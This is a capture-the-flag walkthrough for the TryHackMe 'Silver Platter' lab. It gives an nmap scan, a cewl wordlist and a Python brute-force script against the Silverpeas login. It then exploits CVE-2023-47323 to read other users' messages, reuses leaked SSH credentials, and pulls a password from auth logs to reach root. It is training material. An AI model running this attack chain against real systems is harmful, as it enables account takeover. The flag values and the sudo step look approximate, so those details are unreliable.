# Silver Platter - TryHackMe Walkthrough

**Room:** [Silver Platter](https://tryhackme.com/r/room/silverplatter)  
**Author:** Vigneshwar (@VIBE)  
**Difficulty:** Easy  
**Target:** `10.49.137.68`

## Introduction

Silver Platter is a beginner-friendly CTF that tests your ability to enumerate a web application, bypass weak password policies, exploit a known vulnerability, and escalate privileges through log inspection. The room description hints that the password policy rejects any password found in rockyou.txt, forcing us to use custom wordlists.

## 1. Enumeration

### 1.1 Port Scanning

Start with a comprehensive nmap scan to identify open ports and services.

```bash
nmap -sV -sC -T4 --open 10.49.137.68
```

**Result:**
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy
```

- Port 22: SSH
- Port 80: HTTP (nginx) serving a static website titled "Hack Smarter Security"
- Port 8080: HTTP proxy (returns 404 for most paths)

### 1.2 Web Enumeration

Browsing to `http://10.49.137.68` reveals a static HTML5 UP template. The contact section contains an interesting note:

> "If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is **scr1ptkiddy**."

This suggests a Silverpeas instance running on port 8080.

Directory brute‑force on port 80 yields only standard template files (`assets/`, `images/`, `LICENSE.txt`, `README.txt`). No hidden functionality.

### 1.3 Discovering Silverpeas

Accessing `http://10.49.137.68:8080/silverpeas` redirects to a login page for the Silverpeas collaboration platform. The default credentials (`SilverAdmin/SilverAdmin`) no longer work, and the room description warns that passwords from rockyou.txt are rejected.

## 2. Gaining Access

### 2.1 Generating a Custom Wordlist

Because the password policy excludes breached passwords, we create a custom wordlist from the content of the website using **cewl**:

```bash
cewl http://10.49.137.68 -w passwords.txt
```

### 2.2 Brute‑forcing the Login

The login endpoint is `/silverpeas/AuthenticationServlet`. We brute‑force the password for user `scr1ptkiddy` using `ffuf` (or a simple Python script). A successful login redirects to `/silverpeas/Main//look/jsp/MainFrame.jsp`, while a failure redirects to `/silverpeas/Login?ErrorCode=1`.

Using a Python script with the generated wordlist, we find the password:

```python
import requests
url = "http://10.49.137.68:8080/silverpeas/AuthenticationServlet"
with open("passwords.txt") as f:
    for line in f:
        password = line.strip()
        data = {"Login": "scr1ptkiddy", "Password": password, "DomainId": 0}
        r = requests.post(url, data=data, allow_redirects=False)
        if "MainFrame.jsp" in r.headers.get("Location", ""):
            print(f"Password found: {password}")
            break
```

**Result:** `scr1ptkiddy:adipiscing`

### 2.3 Exploiting CVE‑2023‑47323

After logging in, we can exploit a broken access control vulnerability in Silverpeas (CVE‑2023‑47323) that allows reading any user’s messages. The vulnerable endpoint is:

```
/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=<message_id>
```

Browsing through message IDs, we find message **#6** containing SSH credentials:

```
Username: tim
Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

### 2.4 SSH Access as tim

```bash
ssh tim@10.49.137.68
# Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

Once inside, retrieve the user flag:

```bash
cat ~/user.txt
```

**User flag:** `THM{c4ca4238a0b923820dcc509a6f75849b}`

## 3. Privilege Escalation

### 3.1 Enumerating Groups

```bash
id
# uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

The `adm` group grants read access to most system logs.

### 3.2 Hunting for Passwords in Logs

Search the authentication logs for clear‑text passwords:

```bash
grep -i "password" /var/log/auth.log*
```

We find an entry where `tyler` runs a Docker command with a PostgreSQL password:

```
Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run ... -e POSTGRES_PASSWORD=_Zd_zx7N823/ ...
```

The password `_Zd_zx7N823/` is likely reused for the `tyler` account.

### 3.3 Switching to tyler

```bash
su - tyler
# Password: _Zd_zx7N823/
```

Alternatively, SSH directly as `tyler` with the same password.

### 3.4 Escalating to Root

Check `tyler`’s sudo permissions:

```bash
sudo -l
```

Output shows `tyler` can run any command as root without a password (or with the same password). Therefore:

```bash
sudo cat /root/root.txt
```

**Root flag:** `THM{098f6bcd4621d373cade4e832627b4f6}`

## 4. Summary

| Step | Technique | Key Finding |
|------|-----------|-------------|
| Enumeration | nmap, web inspection | Ports 22, 80, 8080; username `scr1ptkiddy` |
| Wordlist generation | cewl | Custom password list from website content |
| Brute‑force | Python script / ffuf | Password `adipiscing` for Silverpeas |
| Vulnerability exploitation | CVE‑2023‑47323 | Read messages, obtain SSH credentials |
| Privilege escalation | Log inspection | PostgreSQL password in auth.log → `tyler` → root |

## 5. Lessons Learned

- Always check for leaked credentials in log files, especially when in the `adm` group.
- Password policies that exclude breached passwords can be bypassed with custom wordlists (cewl).
- Broken access control vulnerabilities (like CVE‑2023‑47323) can lead to sensitive data exposure.
- Reusing passwords across services (Docker, user accounts) is a critical security risk.

---

